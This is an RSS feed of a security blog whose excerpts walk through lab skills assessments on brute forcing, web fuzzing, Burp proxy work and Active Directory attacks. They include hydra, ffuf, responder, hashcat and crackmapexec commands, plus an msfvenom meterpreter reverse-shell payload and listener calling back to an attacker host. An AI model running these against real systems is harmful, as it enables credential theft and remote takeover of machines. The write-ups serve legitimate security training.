<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Vamsi200 Blog</title>
    <link>https://vamsi200.github.io/</link>
    <description>Recent content on Vamsi200 Blog</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 21 Aug 2025 20:14:58 +0530</lastBuildDate>
    <atom:link href="https://vamsi200.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Explaining FKeylogger: The Rationale Behind Linux Keylogger Detection</title>
      <link>https://vamsi200.github.io/posts/explaining_fkeylogger_the_rationale_behind_linux_keylogger_detection/</link>
      <pubDate>Thu, 21 Aug 2025 20:14:58 +0530</pubDate>
      <guid>https://vamsi200.github.io/posts/explaining_fkeylogger_the_rationale_behind_linux_keylogger_detection/</guid>
      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;&#xA;&lt;p&gt;Keyloggers on Linux are pretty rare - I guess, but they still exist. Are they easy to detect? Well… maybe, maybe not. It really depends on the adversary and how much effort this guy put to hide it. Anyway, I built this project because at some point I decided, &amp;ldquo;Let’s build a tool to detect them&amp;rdquo; - and here we are - &lt;a href=&#34;https://github.com/vamsi200/FKeyLogger&#34;  target=&#34;_blank&#34; rel=&#34;noreferrer nofollow&#34;&gt;Github link&lt;/a&gt;&#xA;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Disclaimer:&#xA;Before we start please do understand that this project is just an exploration and built out of curiosity.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Skills Assessment 1&amp;2 Login Brute Forcing</title>
      <link>https://vamsi200.github.io/posts/skills-assessment1and2-login-brute-forcing/</link>
      <pubDate>Thu, 27 Feb 2025 23:50:05 +0530</pubDate>
      <guid>https://vamsi200.github.io/posts/skills-assessment1and2-login-brute-forcing/</guid>
      <description>&lt;h3 id=&#34;question-1---what-is-the-password-for-the-basic-auth-login&#34;&gt;Question 1 - What is the password for the basic auth login?&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;We were given the username &amp;amp; password wordlists, so let&amp;rsquo;s use them:&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hydra -L &amp;lt;username wordlist&amp;gt; -P &amp;lt;password wordlist&amp;gt; &amp;lt;ip&amp;gt; http-get / -s &amp;lt;port&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/lf1.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;question-2---after-successfully-brute-forcing-the-login-what-is-the-username-you-have-been-given-for-the-next-part-of-the-skills-assessment&#34;&gt;Question 2 - After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;When we login using the credentials that we found we find the username:&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/lf2.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 800px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;skills-assessment-part-2&#34;&gt;Skills Assessment Part 2&lt;/h2&gt;&#xA;&lt;h3 id=&#34;question-1----what-is-the-username-of-the-ftp-user-you-find-via-brute-forcing&#34;&gt;Question 1 -  What is the username of the ftp user you find via brute-forcing?&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;we know the username, I ran a nmap scan and found ssh running.. so let&amp;rsquo;s crack it with the given wordlist.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Skills Assessment   Web Fuzzing</title>
      <link>https://vamsi200.github.io/posts/skills-assessment---web-fuzzing/</link>
      <pubDate>Mon, 24 Feb 2025 23:56:47 +0530</pubDate>
      <guid>https://vamsi200.github.io/posts/skills-assessment---web-fuzzing/</guid>
      <description>&lt;h3 id=&#34;question-1----run-a-sub-domainvhost-fuzzing-scan-on-academyhtb-for-the-ip-shown-above-what-are-all-the-sub-domains-you-can-identify-only-write-the-sub-domain-name&#34;&gt;Question 1 -  Run a sub-domain/vhost fuzzing scan on &amp;lsquo;*.academy.htb&amp;rsquo; for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name)&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Well this is straight forward, let&amp;rsquo;s use &lt;code&gt;subdomains-top1million-5000&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Don&amp;rsquo;t forget to add ip in your &lt;code&gt;hosts&lt;/code&gt; file.&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:&amp;lt;port&amp;gt;/ -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Host: FUZZ.academy.htb&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/ff1.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;question-2----before-you-run-your-page-fuzzing-scan-you-should-first-run-an-extension-fuzzing-scan-what-are-the-different-extensions-accepted-by-the-domains&#34;&gt;Question 2 -  Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Okay, Let&amp;rsquo;s use web-extensions.txt wordlist, pretty straight-forward.&lt;/li&gt;&#xA;&lt;li&gt;I tried fuzzing on 3 different vhosts that we found, and we got our answer.&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:43252/indexFUZZ&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/ff3.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;question-3---one-of-the-pages-you-will-identify-should-say-you-dont-have-access-what-is-the-full-page-url&#34;&gt;Question 3 - One of the pages you will identify should say &amp;lsquo;You don&amp;rsquo;t have access!&amp;rsquo;. What is the full page URL?&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;We have to fuzz on all of our vhosts with recursion and the extensions that we just found.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Skills Assessment Using Web Proxies</title>
      <link>https://vamsi200.github.io/posts/skills-assessment---using-web-proxies/</link>
      <pubDate>Thu, 20 Feb 2025 23:07:18 +0530</pubDate>
      <guid>https://vamsi200.github.io/posts/skills-assessment---using-web-proxies/</guid>
      <description>&lt;h3 id=&#34;question-1---the-luckyphp-page-has-a-button-that-appears-to-be-disabled-try-to-enable-the-button-and-then-click-it-to-get-the-flag&#34;&gt;Question 1 - The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;First make sure to enable &lt;code&gt;Intercept responses&lt;/code&gt; and make it to POST request.&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/wp1.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 1400px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Now Forward the request.&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/wp2.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 1400px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;In Response tab, remove the &lt;code&gt;disabled&lt;/code&gt; and forward it (Going back to your browser, you can click on button which reveals the flag, don&amp;rsquo;t forget to turn Intercept off) or send it to repeater tab and click on send, which would reveal the flag.&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/wp5.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 1000px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;question-2---the-adminphp-page-uses-a-cookie-that-has-been-encoded-multiple-times-try-to-decode-the-cookie-until-you-get-a-value-with-31-characters-submit-the-value-as-the-answer&#34;&gt;Question 2 - The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hitting /admin.php, we get the cookie. Which then can be sent to Decoder:&#xA;cookie -&amp;gt; decode as ASCII Hex -&amp;gt; reveals base64 -&amp;gt; decode as base64 -&amp;gt; flag(31 chars value)&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/wp7.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 1400px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/wp8.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 1400px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;question-3----once-you-decode-the-cookie-you-will-notice-that-it-is-only-31-characters-long-which-appears-to-be-an-md5-hash-missing-its-last-character-so-try-to-fuzz-the-last-character-of-the-decoded-md5-cookie-with-all-alpha-numeric-characters-while-encoding-each-request-with-the-encoding-methods-you-identified-above-you-may-use-the-alphanum-casetxt-wordlist-from-seclist-for-the-payload&#34;&gt;Question 3 -  Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the &amp;ldquo;alphanum-case.txt&amp;rdquo; wordlist from Seclist for the payload)&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Using Intruder, In Payload Processing, we first add our &lt;code&gt;31 chars value as prefix&lt;/code&gt; and Add &lt;code&gt;Base64-encode&lt;/code&gt;, &lt;code&gt;ASCII Hex encode&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Now Let&amp;rsquo;s Load the alphanum-case.txt file. And start attack.&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/wp9.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 1400px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;We can one of the request&amp;rsquo;s responses to get the flag.&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/wp10.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 1400px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;question-4---you-are-using-the-auxiliaryscannerhttpcoldfusion_locale_traversal-tool-within-metasploit-but-it-is-not-working-properly-for-you-you-decide-to-capture-the-request-sent-by-metasploit-so-you-can-manually-verify-it-and-repeat-it-once-you-capture-the-request-what-is-the-xxxxx-directory-being-called-in-xxxxxadministrator&#34;&gt;Question 4 - You are using the &amp;lsquo;auxiliary/scanner/http/coldfusion_locale_traversal&amp;rsquo; tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the &amp;lsquo;XXXXX&amp;rsquo; directory being called in &amp;lsquo;/XXXXX/administrator/..&amp;rsquo;?&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Using Metasploit with &lt;code&gt;auxiliary/scanner/http/coldfusion_locale_traversal&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>AD Enumeration &amp; Attacks Skills Assessment Part II</title>
      <link>https://vamsi200.github.io/posts/ad_enumeration__attacks_-_skills_assessment_part_ii/</link>
      <pubDate>Wed, 19 Feb 2025 22:31:53 +0530</pubDate>
      <guid>https://vamsi200.github.io/posts/ad_enumeration__attacks_-_skills_assessment_part_ii/</guid>
      <description>&lt;h3 id=&#34;question-1---obtain-a-password-hash-for-a-domain-user-account-that-can-be-leveraged-to-gain-a-foothold-in-the-domain-what-is-the-account-name&#34;&gt;Question 1 - Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;When I first read the Question, my first thought was &lt;code&gt;LLMNR/NBT-NS Poisoning&lt;/code&gt;, because of the title that we have in HTB modules(foothold) :), so I ran responder &amp;amp; got the user and hash :&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo responder -I ens224&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD21.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 700px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD22.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 700px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;question-2---what-is-this-users-cleartext-password&#34;&gt;Question 2 - What is this user&amp;rsquo;s cleartext password?&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Cracking the hash with hashcat, we got the password.&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD23.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 700px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;question-3----submit-the-contents-of-the-cflagtxt-file-on-ms01&#34;&gt;Question 3 -  Submit the contents of the C:\flag.txt file on MS01.&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;We need to first find the IP of MS01, let&amp;rsquo;s first run fping to get all the Ip&amp;rsquo;s that are active.&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fping -asgq 172.16.7.0/23&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD24.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;I ran a nmap scan on the Targets and found &lt;code&gt;172.16.7.50&lt;/code&gt; is MS01, so I initially ran crackmapexec to check if our credentials that we just found are useful.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD27.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 700px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD25.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 700px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;We can use winrm to login and get the flag&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD26.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 700px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;question-4--5---use-a-common-method-to-obtain-weak-credentials-for-another-user-submit-the-username-for-the-user-whose-credentials-you-obtain--what-is-this-users-password&#34;&gt;Question 4 &amp;amp; 5 - Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain &amp;amp; What is this user&amp;rsquo;s password?&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;I wanted to use login using xfreerdp, so that I can easily transfer tools.. I used &lt;code&gt;ssh tunneling&lt;/code&gt; to achieve that :&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh -D &lt;span style=&#34;color:#ae81ff&#34;&gt;9050&lt;/span&gt; &amp;lt;user&amp;gt;@&amp;lt;ip&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD28.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 700px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;change/add the proxychains config to use socks4&lt;/p&gt;</description>
    </item>
    <item>
      <title>AD Enumeration &amp; Attacks Skills Assessment Part I</title>
      <link>https://vamsi200.github.io/posts/ad_enumeration__attacks_-_skills_assessment_part_i/</link>
      <pubDate>Sat, 15 Feb 2025 11:40:27 +0530</pubDate>
      <guid>https://vamsi200.github.io/posts/ad_enumeration__attacks_-_skills_assessment_part_i/</guid>
      <description>&lt;h2 id=&#34;initial-access&#34;&gt;Initial Access&lt;/h2&gt;&#xA;&lt;h3 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h3&gt;&#xA;&lt;p&gt;Given the Scenario, we get the user &lt;code&gt;admin&lt;/code&gt; and the password &lt;code&gt;My_W3bsH3ll_*********&lt;/code&gt;, so we login with the credentials:&lt;/p&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD1.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;question-1---submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-of-the-web-server&#34;&gt;Question 1 - Submit the contents of the flag.txt file on the administrator Desktop of the web server&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Well, seems that we can access the contents of the Administrator Desktop, so I just grabbed the flag&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;type C:\Users\Administrator\Desktop\flag.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD2.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;reverse-shell-using-metasploit&#34;&gt;Reverse Shell Using Metasploit&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Payload Generation&lt;/strong&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_https lhost&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;lt;attacker_ip&amp;gt; -f exe -o payload.exe lport&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD3.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Metasploit Listener Configuration&lt;/strong&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use exploit/multi/handler&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set payload windows/x64/meterpreter/reverse_https&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set LHOST 10.10.15.161&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set LPORT &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;div style=&#34;text-align: center; margin: 20px 0;&#34;&gt;&#xA;  &lt;img src=&#34;https://vamsi200.github.io/images/AD4.png&#34; alt=&#34;Image&#34; &#xA;       style=&#34;border: 0px solid grey; border-radius: 6px; &#xA;              max-width: 100%; height: auto; &#xA;              width: 600px;&#34;&gt;&#xA;  &#xA;&lt;/div&gt;&#xA;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Payload Delivery And Execution&lt;/strong&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m 